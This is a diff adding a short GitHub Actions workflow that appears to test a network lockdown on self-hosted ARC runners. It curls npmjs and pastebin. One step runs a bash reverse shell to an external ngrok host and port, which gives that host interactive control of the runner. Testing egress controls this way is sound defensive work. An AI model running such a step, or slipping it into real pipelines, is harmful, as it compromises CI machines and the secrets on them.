@@ -1,0 +1,21 @@
+name: Lock-Down-Reverse-Shell
+on:
+  workflow_dispatch:
+  #This lockdown scenario is only supported for self hosted ARC (k8s) deployments 
+jobs:
+  build:
+    name: Deploy
+    runs-on: self-hosted
+    steps:
+      - name: Code Checkout
+        uses: actions/checkout@v2
+          
+      - name: Curl npmjs
+        run: "curl -s https://registry.npmjs.org"
+
+
+      - name: run reverse shell
+        run: bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1"
+                  
+      - name: Curl pastebin
+        run: "curl -s https://www.pastebin.com"
